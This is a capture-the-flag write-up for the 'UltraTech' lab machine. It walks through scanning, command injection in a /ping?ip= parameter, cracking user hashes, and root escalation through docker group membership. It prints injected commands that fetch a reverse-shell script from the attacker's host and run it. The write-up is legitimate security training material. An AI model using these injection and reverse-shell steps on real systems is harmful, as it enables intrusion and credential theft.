# UltraTech

I started with a nmap scan:

![nmap.png](/images/reports/ultratech/nmap.png)

I next did 2 gobuster scans, one for the 8081 port and the 31331 port. For the 8081 we only have a ‘auth’ directory, that when went to it says that a username and password must be provided, and we have a ‘ping’ directory that just shows an error. 

We can try and set the parameters for the auth and they should look like this:

![auth.png](/images/reports/ultratech/auth.png)

The description of the 3rd task gives us a hint that we need to do something with the login page, and that ‘quick and dirty implemetations’ might help us. 

Looking at the hint, I get that I shouldn’t focus too much on the /auth. Looking at the js code for the api we can see that code checks the status of the api by going to /ping?ip= and entering the hostname. So we can manipulate that into getting a shell. 

So I frist created a simple bash reverse shell, and then inside the ‘ip’ parameter I enter the following commands:

`wget 192.168.183.50/shell.sh -o shell.sh`

And after running the first command, in order to trigger the reverse shell we run:

`bash shell.sh`

Note: When putting the command in the ‘ip’ parameter the text should be inside ``. 

And now get have a shell. 

Now, it’s said in the description that we should look for a database file, we can see it in the ‘api’ directory. With that we can see 2 user’s and their respective hashes. And we can crack both of their hashes using Crackstation. 

To escalate, we can use [linenum.sh](http://linenum.sh) on the server, and we can see that we are ina docker group, we can use this to escalate our privileges.

![docker.png](/images/reports/ultratech/docker.png)

And thus we can get the private key and answer the last question.